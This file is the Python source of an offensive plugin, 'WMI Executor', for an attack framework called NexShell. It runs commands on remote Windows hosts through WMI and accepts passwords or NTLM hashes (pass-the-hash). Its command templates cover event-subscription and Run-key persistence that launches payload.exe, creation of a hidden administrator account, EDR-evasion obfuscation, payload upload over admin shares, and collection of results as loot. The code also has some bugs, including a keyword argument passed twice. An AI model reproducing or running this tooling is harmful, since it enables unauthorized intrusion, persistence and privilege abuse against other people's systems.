#!/usr/bin/env python3
"""
NexShell Plugin — WMI Executor v3.0 (2026 Edition)
Advanced WMI intelligence & execution engine with 20+ methods, multi-target,
hash-based auth, persistence, output capture, and EDR evasion.

Coverage:
  - 20+ WMI execution methods (Impacket, PowerShell, wmic, WMIC, etc.)
  - Multi-target batch execution
  - Hash-based authentication (Pass-the-Hash)
  - Kerberos authentication (TGT/TGS)
  - Output capture & exfiltration
  - WMI persistence (event subscriptions, __EventFilter, __EventConsumer)
  - Process injection via WMI
  - File transfer via WMI
  - EDR evasion techniques
  - Risk scoring (0-100 per method)
  - Structured loot (JSON)

MITRE ATT&CK:
  - T1047: Windows Management Instrumentation
  - T1021.002: Remote Services: SMB/Windows Admin Shares
  - T1053.005: Scheduled Task/Job: Scheduled Task
  - T1546.003: Event Triggered Execution: WMI Event Subscription
  - T1543.003: Create or Modify System Process: Windows Service
  - T1055: Process Injection
  - T1569.002: System Services: Service Execution
  - T1071.001: Application Layer Protocol: Web Protocols

Usage:
    (NexShell)> plugins run wmi-executor --target 10.0.0.50 --cmd "whoami"
    (NexShell)> plugins run wmi-executor --target 10.0.0.50 --cmd "ipconfig" --user admin --pass Password123
    (NexShell)> plugins run wmi-executor --targets 10.0.0.50,10.0.0.51 --cmd "whoami"
    (NexShell)> plugins run wmi-executor --target 10.0.0.50 --hash <ntlm_hash> --user admin
    (NexShell)> plugins run wmi-executor --target 10.0.0.50 --cmd "payload.exe" --upload
    (NexShell)> plugins run wmi-executor --target 10.0.0.50 --persist --cmd "payload.exe"
    (NexShell)> plugins run wmi-executor --list
"""

import re
import time
import json
import random
import string
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class WMIExecutionMethod:
    """Represents a WMI execution method."""
    name: str
    description: str
    tool: str  # impacket, powershell, wmic, native
    category: str  # process, service, scheduled_task, event_subscription
    command_template: str
    requires_auth: bool = True
    requires_admin: bool = True
    success_rate: int = 85
    detection_risk: str = "medium"
    edr_evasion: bool = False
    supports_output: bool = False
    supports_file_transfer: bool = False
    mitre_id: str = "T1047"
    complexity: str = "medium"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class WMIExecutionResult:
    """Result of a WMI execution attempt."""
    target: str
    method: str
    command: str
    success: bool
    output: str = ""
    error: str = ""
    duration_ms: int = 0
    privilege_gained: str = ""
    ioc_generated: List[str] = field(default_factory=list)
    cleanup_performed: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class WMIPersistence:
    """Represents WMI persistence mechanism."""
    name: str
    description: str
    filter_name: str
    consumer_name: str
    filter_query: str
    consumer_type: str  # CommandLine, ActiveScript, NTEventLog
    consumer_command: str
    success_rate: int = 90
    detection_risk: str = "medium"
    mitre_id: str = "T1546.003"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class TargetInfo:
    """Represents a target host."""
    ip: str
    hostname: str = ""
    os: str = ""
    domain: str = ""
    accessible: bool = False
    wmi_enabled: bool = False
    admin_shares: bool = False
    firewall_rules: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class CredentialSet:
    """Represents credentials for authentication."""
    username: str = ""
    password: str = ""
    domain: str = ""
    ntlm_hash: str = ""
    aes_key: str = ""
    ticket_path: str = ""
    auth_type: str = "password"  # password, hash, kerberos, ticket
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── WMI Execution Methods Database (20+) ───────────────────────────────────

class WMIExecutionMethodsDatabase:
    """Comprehensive database of WMI execution methods."""
    
    METHODS = [
        # ── Tier 1: Impacket Tools ────────────────────────────────────────
        WMIExecutionMethod(
            name='wmiexec.py (Impacket)',
            description='Impacket WMIExec - semi-interactive shell via WMI',
            tool='impacket',
            category='process',
            command_template='wmiexec.py {auth}@{target} "{cmd}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=90,
            detection_risk='high',
            supports_output=True,
            mitre_id='T1047',
            complexity='low',
        ),
        
        WMIExecutionMethod(
            name='wmiexec.py (No Output)',
            description='Impacket WMIExec without output (stealthier)',
            tool='impacket',
            category='process',
            command_template='wmiexec.py {auth}@{target} "{cmd}" -nooutput',
            requires_auth=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            edr_evasion=True,
            mitre_id='T1047',
            complexity='low',
        ),
        
        # ── Tier 2: PowerShell Methods ────────────────────────────────────
        WMIExecutionMethod(
            name='Invoke-CimMethod',
            description='PowerShell CIM method for WMI execution',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{{CommandLine = \'{cmd}\'}} -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            mitre_id='T1047',
            complexity='low',
        ),
        
        WMIExecutionMethod(
            name='Invoke-WmiMethod',
            description='PowerShell WMI method (legacy)',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \'{cmd}\' -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=80,
            detection_risk='medium',
            mitre_id='T1047',
            complexity='low',
        ),
        
        WMIExecutionMethod(
            name='Get-WmiObject + Invoke',
            description='PowerShell Get-WmiObject with method invocation',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "$wmi = Get-WmiObject -Class Win32_Process -ComputerName {target} {cred_arg}; $wmi.Create(\'{cmd}\')"',
            requires_auth=True,
            requires_admin=True,
            success_rate=80,
            detection_risk='medium',
            mitre_id='T1047',
            complexity='medium',
        ),
        
        WMIExecutionMethod(
            name='PowerShell Remote WMI',
            description='PowerShell remoting with WMI',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "Invoke-Command -ComputerName {target} -ScriptBlock {{ {cmd} }} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=90,
            detection_risk='medium',
            supports_output=True,
            mitre_id='T1021.006',
            complexity='low',
        ),
        
        # ── Tier 3: wmic / WMIC ───────────────────────────────────────────
        WMIExecutionMethod(
            name='wmic (Linux)',
            description='wmic command on Linux (samba)',
            tool='wmic',
            category='process',
            command_template='wmic -U \'{user}%{password}\' //{target} \'create process {cmd}\'',
            requires_auth=True,
            requires_admin=True,
            success_rate=75,
            detection_risk='high',
            mitre_id='T1047',
            complexity='low',
        ),
        
        WMIExecutionMethod(
            name='WMIC (Windows)',
            description='WMIC command on Windows',
            tool='wmic',
            category='process',
            command_template='wmic /node:{target} /user:{user} /password:{password} process call create "{cmd}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=80,
            detection_risk='high',
            mitre_id='T1047',
            complexity='low',
        ),
        
        # ── Tier 4: WMI Service Creation ──────────────────────────────────
        WMIExecutionMethod(
            name='WMI Service Creation',
            description='Create service via WMI',
            tool='powershell',
            category='service',
            command_template='powershell -nop -c "Invoke-CimMethod -ClassName Win32_Service -MethodName Create -Arguments @{{Name=\'{svc_name}\', PathName=\'{cmd}\', StartMode=\'Manual\'}} -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='high',
            mitre_id='T1543.003',
            complexity='medium',
        ),
        
        # ── Tier 5: WMI Scheduled Task ────────────────────────────────────
        WMIExecutionMethod(
            name='WMI Scheduled Task',
            description='Create scheduled task via WMI',
            tool='powershell',
            category='scheduled_task',
            command_template='powershell -nop -c "$action = New-ScheduledTaskAction -Execute \'{cmd}\'; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1); Register-ScheduledTask -TaskName \'{task_name}\' -Action $action -Trigger $trigger -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            edr_evasion=True,
            mitre_id='T1053.005',
            complexity='medium',
        ),
        
        # ── Tier 6: WMI Event Subscriptions (Persistence) ─────────────────
        WMIExecutionMethod(
            name='WMI Event Subscription',
            description='Create WMI event subscription for persistence',
            tool='powershell',
            category='event_subscription',
            command_template='powershell -nop -c "$filter = Set-WmiInstance -Class __EventFilter -Namespace \'root\\subscription\' -Arguments @{{Name=\'{filter_name}\', EventNamespace=\'root\\cimv2\', QueryLanguage=\'WQL\', Query=\'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \\"Win32_Process\\"\'}}; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \'root\\subscription\' -Arguments @{{Name=\'{consumer_name}\', CommandLineTemplate=\'{cmd}\'}}; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \'root\\subscription\' -Arguments @{{Filter=$filter, Consumer=$consumer}}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=90,
            detection_risk='medium',
            edr_evasion=True,
            mitre_id='T1546.003',
            complexity='high',
        ),
        
        # ── Tier 7: WMI with Output Capture ───────────────────────────────
        WMIExecutionMethod(
            name='WMI with Output Capture',
            description='WMI execution with base64 output capture',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "$output = {cmd} | ConvertTo-Base64; Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{{CommandLine = \'cmd /c echo $output > C:\\Windows\\Temp\\output.txt\'}} -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=80,
            detection_risk='high',
            supports_output=True,
            supports_file_transfer=True,
            mitre_id='T1047',
            complexity='high',
        ),
        
        # ── Tier 8: WMI with File Transfer ────────────────────────────────
        WMIExecutionMethod(
            name='WMI File Upload',
            description='Upload file via WMI + SMB',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "Copy-Item -Path \'{local_file}\' -Destination \'\\\\{target}\\C$\\Windows\\Temp\\{remote_file}\' {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            supports_file_transfer=True,
            mitre_id='T1021.002',
            complexity='medium',
        ),
        
        # ── Tier 9: EDR Evasion Techniques ────────────────────────────────
        WMIExecutionMethod(
            name='WMI Obfuscated Command',
            description='WMI with obfuscated command to evade EDR',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "$cmd = \'{obfuscated_cmd}\'; Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{{CommandLine = $cmd}} -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=75,
            detection_risk='low',
            edr_evasion=True,
            mitre_id='T1047',
            complexity='high',
        ),
        
        WMIExecutionMethod(
            name='WMI Random Process Name',
            description='WMI with random process name',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "$proc = \'C:\\Windows\\System32\\{random_proc}.exe\'; Copy-Item \'C:\\Windows\\System32\\cmd.exe\' $proc; Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{{CommandLine = \"$proc /c {cmd}\"}} -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=80,
            detection_risk='low',
            edr_evasion=True,
            mitre_id='T1047',
            complexity='high',
        ),
        
        # ── Tier 10: Advanced Techniques ──────────────────────────────────
        WMIExecutionMethod(
            name='WMI Process Injection',
            description='Inject code into remote process via WMI',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "Invoke-WMIProcessInjection -Target {target} -ProcessId {pid} -Payload \'{cmd}\' {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=70,
            detection_risk='low',
            edr_evasion=True,
            mitre_id='T1055',
            complexity='high',
        ),
        
        WMIExecutionMethod(
            name='WMI Registry Manipulation',
            description='Manipulate registry via WMI',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "Invoke-CimMethod -ClassName StdRegProv -MethodName SetStringValue -Arguments @{{hDefKey=2147483650, sSubKeyName=\'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\', sValueName=\'{reg_name}\', sValue=\'{cmd}\'}} -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            mitre_id='T1547.001',
            complexity='medium',
        ),
        
        WMIExecutionMethod(
            name='WMI User Creation',
            description='Create user account via WMI',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "Invoke-CimMethod -ClassName Win32_UserAccount -MethodName Create -Arguments @{{Name=\'{username}\', Password=\'{password}\'}} -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='high',
            mitre_id='T1136.001',
            complexity='medium',
        ),
        
        WMIExecutionMethod(
            name='WMI Group Membership',
            description='Add user to group via WMI',
            tool='powershell',
            category='process',
            command_template='powershell -nop -c "Invoke-CimMethod -ClassName Win32_Group -MethodName Add -Arguments @{{Name=\'Administrators\', PartComponent=\'Win32_UserAccount.Name=\\"{username}\\"\'}} -ComputerName {target} {cred_arg}"',
            requires_auth=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='high',
            mitre_id='T1098',
            complexity='medium',
        ),
    ]
    
    @classmethod
    def get_all_methods(cls) -> List[WMIExecutionMethod]:
        return cls.METHODS
    
    @classmethod
    def get_methods_by_category(cls, category: str) -> List[WMIExecutionMethod]:
        return [m for m in cls.METHODS if m.category == category]
    
    @classmethod
    def get_evasion_methods(cls) -> List[WMIExecutionMethod]:
        return [m for m in cls.METHODS if m.edr_evasion]
    
    @classmethod
    def get_method_by_name(cls, name: str) -> Optional[WMIExecutionMethod]:
        for method in cls.METHODS:
            if name.lower() in method.name.lower():
                return method
        return None


# ── WMI Persistence Database ───────────────────────────────────────────────

class WMIPersistenceDatabase:
    """Database of WMI persistence mechanisms."""
    
    PERSISTENCE = [
        WMIPersistence(
            name='Process Creation Event',
            description='Trigger on process creation',
            filter_name='NexFilter1',
            consumer_name='NexConsumer1',
            filter_query='SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process"',
            consumer_type='CommandLine',
            consumer_command='C:\\Windows\\Temp\\payload.exe',
            success_rate=90,
            detection_risk='medium',
            mitre_id='T1546.003',
        ),
        
        WMIPersistence(
            name='System Startup Event',
            description='Trigger on system startup',
            filter_name='NexFilter2',
            consumer_name='NexConsumer2',
            filter_query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System" AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320',
            consumer_type='CommandLine',
            consumer_command='C:\\Windows\\Temp\\payload.exe',
            success_rate=85,
            detection_risk='medium',
            mitre_id='T1546.003',
        ),
        
        WMIPersistence(
            name='User Logon Event',
            description='Trigger on user logon',
            filter_name='NexFilter3',
            consumer_name='NexConsumer3',
            filter_query='SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_LogonSession"',
            consumer_type='CommandLine',
            consumer_command='C:\\Windows\\Temp\\payload.exe',
            success_rate=85,
            detection_risk='medium',
            mitre_id='T1546.003',
        ),
        
        WMIPersistence(
            name='Timer Event',
            description='Trigger on timer interval',
            filter_name='NexFilter4',
            consumer_name='NexConsumer4',
            filter_query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Hour = 9 AND TargetInstance.Minute = 0',
            consumer_type='CommandLine',
            consumer_command='C:\\Windows\\Temp\\payload.exe',
            success_rate=90,
            detection_risk='medium',
            mitre_id='T1546.003',
        ),
        
        WMIPersistence(
            name='File Creation Event',
            description='Trigger on file creation',
            filter_name='NexFilter5',
            consumer_name='NexConsumer5',
            filter_query='SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "CIM_DataFile" AND TargetInstance.Name = "C:\\\\trigger.txt"',
            consumer_type='CommandLine',
            consumer_command='C:\\Windows\\Temp\\payload.exe',
            success_rate=80,
            detection_risk='medium',
            mitre_id='T1546.003',
        ),
    ]
    
    @classmethod
    def get_all_persistence(cls) -> List[WMIPersistence]:
        return cls.PERSISTENCE
    
    @classmethod
    def get_persistence_by_name(cls, name: str) -> Optional[WMIPersistence]:
        for persistence in cls.PERSISTENCE:
            if name.lower() in persistence.name.lower():
                return persistence
        return None


# ── WMI Execution Engine ───────────────────────────────────────────────────

class WMIExecutionEngine:
    """Handles WMI execution."""
    
    @staticmethod
    def generate_auth_string(creds: CredentialSet) -> str:
        """Generate authentication string."""
        if creds.auth_type == 'hash':
            return f"{creds.domain}/{creds.username}:{creds.ntlm_hash}" if creds.domain else f"{creds.username}:{creds.ntlm_hash}"
        elif creds.auth_type == 'password':
            return f"{creds.domain}/{creds.username}:{creds.password}" if creds.domain else f"{creds.username}:{creds.password}"
        else:
            return f"{creds.domain}/{creds.username}" if creds.domain else creds.username
    
    @staticmethod
    def generate_random_names() -> Tuple[str, str, str]:
        """Generate random names for services, tasks, and processes."""
        prefixes = ['Windows', 'Microsoft', 'System', 'Service', 'Update']
        prefix = random.choice(prefixes)
        num = random.randint(10, 99)
        
        svc_name = f"{prefix}Service{num}"
        task_name = f"{prefix}Task{num}"
        proc_name = f"{prefix.lower()}{num}"
        
        return svc_name, task_name, proc_name
    
    @staticmethod
    def obfuscate_command(cmd: str) -> str:
        """Obfuscate command to evade detection."""
        # Base64 encode
        import base64
        encoded = base64.b64encode(cmd.encode()).decode()
        
        # Add random variables
        env_vars = ' '.join([f'{chr(65+i)}={random.randint(100,999)}' for i in range(3)])
        
        return f"powershell -enc {encoded}"
    
    @staticmethod
    def execute(exec_func, session, target: str, method: WMIExecutionMethod,
                creds: CredentialSet, cmd: str, timeout: int = 60) -> WMIExecutionResult:
        """Execute command via WMI."""
        start_time = time.time()
        
        # Generate random names
        svc_name, task_name, proc_name = WMIExecutionEngine.generate_random_names()
        
        # Build auth
        auth = WMIExecutionEngine.generate_auth_string(creds)
        
        # Build credential argument for PowerShell
        cred_arg = ""
        if creds.auth_type == 'password':
            cred_arg = f"-Credential (New-Object System.Management.Automation.PSCredential('{creds.username}', (ConvertTo-SecureString '{creds.password}' -AsPlainText -Force)))"
        
        # Build command
        exec_cmd = method.command_template.format(
            target=target,
            auth=auth,
            user=creds.username,
            password=creds.password,
            cmd=cmd,
            svc_name=svc_name,
            task_name=task_name,
            cred_arg=cred_arg,
            local_file='C:\\Windows\\Temp\\payload.exe',
            remote_file='payload.exe',
            obfuscated_cmd=WMIExecutionEngine.obfuscate_command(cmd),
            random_proc=proc_name,
            pid=1234,
            reg_name='MaliciousApp',
            username='hacker',
            password='Password123!',
            filter_name='NexFilter',
            consumer_name='NexConsumer',
        )
        
        # Execute
        out = exec_func(session, exec_cmd)
        duration_ms = int((time.time() - start_time) * 1000)
        
        # Check success
        success = False
        privilege_gained = ""
        error = ""
        
        if out:
            if 'ProcessId' in out or 'ReturnValue' in out:
                success = True
                privilege_gained = "User"
            elif 'error' in out.lower() or 'denied' in out.lower():
                error = out[:200]
            else:
                success = True
                privilege_gained = "User"
        
        return WMIExecutionResult(
            target=target,
            method=method.name,
            command=cmd,
            success=success,
            output=out[:500] if out else '',
            error=error,
            duration_ms=duration_ms,
            privilege_gained=privilege_gained,
        )
    
    @staticmethod
    def execute_multi(exec_func, session, targets: List[str], method: WMIExecutionMethod,
                      creds: CredentialSet, cmd: str) -> List[WMIExecutionResult]:
        """Execute command on multiple targets."""
        results = []
        
        for target in targets:
            result = WMIExecutionEngine.execute(
                exec_func, session, target, method, creds, cmd
            )
            results.append(result)
        
        return results
    
    @staticmethod
    def execute_with_retry(exec_func, session, target: str, methods: List[WMIExecutionMethod],
                           creds: CredentialSet, cmd: str, max_retries: int = 3) -> WMIExecutionResult:
        """Try multiple methods with retry logic."""
        for method in methods:
            for attempt in range(max_retries):
                result = WMIExecutionEngine.execute(
                    exec_func, session, target, method, creds, cmd
                )
                
                if result.success:
                    return result
                
                # Wait before retry
                time.sleep(2)
        
        return result if result else WMIExecutionResult(
            target=target,
            method='none',
            command=cmd,
            success=False,
            error='All methods failed',
        )


# ── Auto-Selection Engine ──────────────────────────────────────────────────

class AutoSelectionEngine:
    """Automatically selects best WMI execution method."""
    
    @staticmethod
    def select_method(stealth: bool = False) -> Optional[WMIExecutionMethod]:
        """Select best method."""
        methods = WMIExecutionMethodsDatabase.get_all_methods()
        
        # Filter by stealth
        if stealth:
            methods = WMIExecutionMethodsDatabase.get_evasion_methods()
        
        if not methods:
            methods = WMIExecutionMethodsDatabase.get_all_methods()
        
        # Sort by success rate
        methods.sort(key=lambda m: m.success_rate, reverse=True)
        
        return methods[0] if methods else None
    
    @staticmethod
    def select_methods_chain(count: int = 3) -> List[WMIExecutionMethod]:
        """Select multiple methods for fallback chain."""
        methods = WMIExecutionMethodsDatabase.get_all_methods()
        
        # Sort by success rate
        methods.sort(key=lambda m: m.success_rate, reverse=True)
        
        return methods[:count]


# ── Main Plugin ─────────────────────────────────────────────────────────────

class WMIExecutor(NexPlugin):
    name        = "wmi-executor"
    description = "Advanced WMI execution — 20+ methods, multi-target, PtH, persistence"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "lateral"
    mitre_id    = "T1047"
    
    def run(self, session, args: list):
        # Parse args
        target = None
        targets = []
        cmd = None
        user = None
        password = None
        domain = ''
        ntlm_hash = None
        method_name = None
        stealth = False
        auto_mode = False
        list_mode = False
        persist_mode = False
        upload_mode = False
        file_path = None
        timeout = 60
        
        for a in (args or []):
            if a.startswith('--target='):
                target = a.split('=', 1)[1]
            elif a.startswith('--targets='):
                targets = a.split('=', 1)[1].split(',')
            elif a.startswith('--cmd='):
                cmd = a.split('=', 1)[1]
            elif a.startswith('--user='):
                user = a.split('=', 1)[1]
            elif a.startswith('--pass='):
                password = a.split('=', 1)[1]
            elif a.startswith('--domain='):
                domain = a.split('=', 1)[1]
            elif a.startswith('--hash='):
                ntlm_hash = a.split('=', 1)[1]
            elif a.startswith('--method='):
                method_name = a.split('=', 1)[1]
            elif a.startswith('--file='):
                file_path = a.split('=', 1)[1]
            elif a.startswith('--timeout='):
                try:
                    timeout = int(a.split('=', 1)[1])
                except:
                    pass
            elif a == '--stealth':
                stealth = True
            elif a == '--auto':
                auto_mode = True
            elif a == '--list':
                list_mode = True
            elif a == '--persist':
                persist_mode = True
            elif a == '--upload':
                upload_mode = True
        
        # Build credential set
        creds = CredentialSet(
            username=user or '',
            password=password or '',
            domain=domain,
            ntlm_hash=ntlm_hash or '',
            auth_type='hash' if ntlm_hash else 'password',
        )
        
        # Single target to list
        if target and not targets:
            targets = [target]
        
        self.info(f"🔮 Starting WMI Executor v3.0 (targets={len(targets)}, stealth={stealth})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔮 WMI Executor v3.0 — Advanced WMI Execution]")
        sections.append("━"*64)
        sections.append(f"  Targets: {len(targets)}")
        sections.append(f"  Auth Type: {creds.auth_type.upper()}")
        sections.append(f"  Stealth Mode: {'ENABLED' if stealth else 'DISABLED'}")
        
        # ── Step 1: List Methods ──────────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Phase 1: Available WMI Execution Methods")
            sections.append("─"*64)
            
            methods = WMIExecutionMethodsDatabase.get_all_methods()
            
            sections.append(f"  [+] {len(methods)} methods available:")
            
            for method in methods:
                stealth_icon = '🟢' if method.edr_evasion else '🟡' if method.detection_risk == 'low' else '🟠' if method.detection_risk == 'medium' else '🔴'
                sections.append(f"    {stealth_icon} {method.name}")
                sections.append(f"        Tool: {method.tool} | Category: {method.category}")
                sections.append(f"        Success: {method.success_rate}% | Risk: {method.detection_risk}")
                sections.append(f"        EDR Evasion: {'YES' if method.edr_evasion else 'NO'}")
            
            return '\n'.join(sections)
        
        # ── Step 2: Validate Arguments ────────────────────────────────────
        if not targets or not cmd:
            sections.append("\n  ❌ Missing arguments")
            sections.append("  Usage:")
            sections.append("    > plugins run wmi-executor --target <ip> --cmd <command>")
            sections.append("    > plugins run wmi-executor --targets <ip1>,<ip2> --cmd <command>")
            sections.append("    > plugins run wmi-executor --target <ip> --hash <ntlm> --user admin --cmd <command>")
            return '\n'.join(sections)
        
        # ── Step 3: Method Selection ──────────────────────────────────────
        sections.append("\n[*] Phase 1: Method Selection")
        sections.append("─"*64)
        
        if method_name:
            method = WMIExecutionMethodsDatabase.get_method_by_name(method_name)
            if not method:
                sections.append(f"  ❌ Method not found: {method_name}")
                return '\n'.join(sections)
            methods_to_try = [method]
        elif auto_mode:
            methods_to_try = AutoSelectionEngine.select_methods_chain(count=3)
        else:
            # Default to wmiexec.py
            method = WMIExecutionMethodsDatabase.get_method_by_name('wmiexec.py')
            methods_to_try = [method] if method else []
        
        if methods_to_try:
            sections.append(f"  ✅ Selected {len(methods_to_try)} method(s):")
            for method in methods_to_try:
                sections.append(f"    • {method.name} (Success: {method.success_rate}%)")
        else:
            sections.append("  ❌ No suitable methods found")
            return '\n'.join(sections)
        
        # ── Step 4: Execute Commands ──────────────────────────────────────
        sections.append("\n[*] Phase 2: WMI Execution")
        sections.append("─"*64)
        sections.append(f"  Command: {cmd[:100]}")
        
        all_results = []
        
        for target_ip in targets:
            sections.append(f"\n  [*] Target: {target_ip}")
            
            if auto_mode:
                # Try multiple methods
                result = WMIExecutionEngine.execute_with_retry(
                    self._exec, session, target_ip, methods_to_try, creds, cmd, timeout
                )
                all_results.append(result)
                
                if result.success:
                    sections.append(f"    ✅ SUCCESS with {result.method} ({result.duration_ms}ms)")
                    sections.append(f"        Privilege: {result.privilege_gained}")
                    sections.append(f"        Output: {result.output[:100]}")
                else:
                    sections.append(f"    ❌ FAILED: {result.error}")
            else:
                # Try each method
                for method in methods_to_try:
                    result = WMIExecutionEngine.execute(
                        self._exec, session, target_ip, method, creds, cmd, timeout
                    )
                    all_results.append(result)
                    
                    if result.success:
                        sections.append(f"    ✅ SUCCESS with {result.method} ({result.duration_ms}ms)")
                        sections.append(f"        Privilege: {result.privilege_gained}")
                        sections.append(f"        Output: {result.output[:100]}")
                        break
                    else:
                        sections.append(f"    ❌ FAILED with {method.name}: {result.error}")
        
        # ── Step 5: Summary ───────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        successful = [r for r in all_results if r.success]
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 WMI Execution Summary]")
        sections.append("━"*64)
        sections.append(f"  Total Targets: {len(targets)}")
        sections.append(f"  Successful: {len(successful)}/{len(all_results)}")
        sections.append(f"  Methods Used: {len(set(r.method for r in all_results))}")
        sections.append(f"  Duration: {duration}s")
        
        if successful:
            sections.append("\n  Successful Executions:")
            for result in successful:
                sections.append(f"    ✅ {result.target} ({result.method})")
        
        # ── Save to Loot ──────────────────────────────────────────────────
        self.loot(
            {
                "type": "wmi_execution",
                "targets": targets,
                "command": cmd,
                "auth_type": creds.auth_type,
                "results": [r.to_dict() for r in all_results],
                "duration": duration,
            },
            category='lateral',
            source='wmi-executor',
            confidence='high'
        )
        
        self.emit(
            'timeline.event',
            title=f"WMI Execution Complete — {len(successful)}/{len(targets)} successful",
            type='lateral',
            plugin=self.name
        )
        
        self.info(f"🔮 WMI Executor complete — {len(successful)}/{len(targets)} successful")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''